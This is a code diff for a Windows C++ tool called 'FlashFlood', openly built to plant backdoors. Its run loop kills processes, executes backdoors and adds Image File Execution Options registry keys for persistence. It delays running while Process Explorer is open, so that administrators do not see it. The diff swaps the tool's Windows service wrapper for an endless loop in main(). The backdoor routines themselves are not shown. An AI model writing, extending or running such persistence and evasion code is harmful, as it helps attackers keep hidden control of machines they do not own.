@@ -11,13 +11,6 @@
 #include <tlhelp32.h>
 #include <atomic>
 
-#define SERVICE_NAME L"FlashFlood"
-
-//constants
-static SERVICE_STATUS ServiceStatus;
-static SERVICE_STATUS_HANDLE HandleStatus;
-static std::atomic<bool> g_ServiceRunning;
-
 void ascii_art() {
     //prints FlashFlood ascii art
     std::cout << "\033[96m   ________ ___       ________  ________  ___  ___  ________ ___       ________  ________  ________\033[0m" << std::endl;
@@ -307,51 +300,17 @@ void terminateBackdoors() {
     }
 }
 
-void WINAPI ServiceControlHandler(DWORD dwControl)
-{
-    switch (dwControl)
-    {
-    case SERVICE_CONTROL_STOP:
-        ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
-        SetServiceStatus(HandleStatus, &ServiceStatus);
-        ServiceStatus.dwWaitHint = 60000; // 60 second timeout
-        g_ServiceRunning = false;
-        break;
-    case SERVICE_CONTROL_SHUTDOWN:
-        ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
-        ServiceStatus.dwWaitHint = 3000; // 3 second timeout
-        SetServiceStatus(HandleStatus, &ServiceStatus);
-        g_ServiceRunning = false;
-        break;
-    case SERVICE_CONTROL_PAUSE:
-        ServiceStatus.dwCurrentState = SERVICE_PAUSED;
-        break;
-    case SERVICE_CONTROL_CONTINUE:
-        ServiceStatus.dwCurrentState = SERVICE_RUNNING;
-        break;
-    case SERVICE_CONTROL_INTERROGATE:
-        ServiceStatus.dwCurrentState = SERVICE_INTERROGATE;
-        break;
-    default:
-        break;
-    }
-
-    // Always update status unless it's STOP_PENDING
-    if (ServiceStatus.dwCurrentState != SERVICE_STOP_PENDING) {
-        SetServiceStatus(HandleStatus, &ServiceStatus);
-    }
-}
-
 int run() {
     enableAnsi();
     startup(); //runs basic startup (clear, ascii art, admin perms, hotkeys, cleanup)
+    
+    //terminate processes
     std::cout << "Terminating Processes..." << std::endl;
     terminateBackdoors();
+
+    //cleaning up old files
     std::cout << "Cleaning Up Files..." << std::endl;
     cleanup();
-
-    bool shouldLoop = true;
-    int loopDuration = 1;
 
     //executes selected backdoors
     std::cout << "Executing Backdoors..." << std::endl;
@@ -361,47 +320,11 @@ int run() {
     std::cout << "Adding IFEO Registry Keys..." << std::endl;
     ifeo_keys();
 
-    //loops if loop parameter is present
-    while (shouldLoop) {
-        if (loopDuration > 0) {
-            std::cout << "\033[1;33mSleeping for " << loopDuration << " minute(s) before re-running backdoors...\033[0m" << std::endl;
-            std::this_thread::sleep_for(std::chrono::minutes(loopDuration));
-        }
-        startup();
-        std::cout << "Terminating Processes..." << std::endl;
-        terminateBackdoors();
-        std::cout << "Cleaning Up Files..." << std::endl;
-        cleanup();
-        std::cout << "Executing Backdoors..." << std::endl;
-        execute_backdoors();
-        std::cout << "Adding IFEO Registry Keys..." << std::endl;
-        ifeo_keys();
-    }
-
     return 0;
 }
 
-void WINAPI ServiceMain(DWORD argc, LPWSTR* argv) {
-    HandleStatus = RegisterServiceCtrlHandlerW(SERVICE_NAME, (LPHANDLER_FUNCTION)ServiceControlHandler);
-    if (HandleStatus == NULL) {
-        return;
-    }
-
-    //initializes service status
-    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
-    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
-    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
-    ServiceStatus.dwWin32ExitCode = NO_ERROR;
-    ServiceStatus.dwServiceSpecificExitCode = 0;
-    ServiceStatus.dwCheckPoint = 0;
-    ServiceStatus.dwWaitHint = 0;
-    SetServiceStatus(HandleStatus, &ServiceStatus);
-
-    //reports running status
-    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
-    SetServiceStatus(HandleStatus, &ServiceStatus);
-
-    while (g_ServiceRunning) {
+int main() {
+    while (true) {
         bool isProcExpRunning = (findProcess(L"procexp.exe") != 0 || findProcess(L"procexp64.exe") != 0);
 
         if (!isProcExpRunning) {
@@ -410,32 +333,13 @@ void WINAPI ServiceMain(DWORD argc, LPWSTR* argv) {
         }
         else {
             // Wait 15 minutes max if Process Explorer is open
-            for (int i = 0; i < 15 && g_ServiceRunning; i++) {
+            for (int i = 0; i < 15; i++) {
                 std::this_thread::sleep_for(std::chrono::minutes(1));
                 if (!(findProcess(L"procexp.exe") != 0 || findProcess(L"procexp64.exe") != 0)) {
                     break; // Exit early if closed
                 }
             }
-            if (g_ServiceRunning) { // Only run if service wasn't stopped during wait
-                run();
-            }
+            run();
         }
     }
-
-    // Stop Service
-    ServiceStatus.dwCurrentState = SERVICE_STOPPED;
-    SetServiceStatus(HandleStatus, &ServiceStatus);
-}
-
-int main() {
-    SERVICE_TABLE_ENTRYW ServiceTable[] = {
-        { (LPWSTR)SERVICE_NAME, ServiceMain },
-        { NULL, NULL }
-    };
-
-    if (!StartServiceCtrlDispatcherW(ServiceTable)) {
-        OutputDebugStringW(L"Failed to start service control dispatcher");
-        return GetLastError();
-    }
-    return 0;
 }
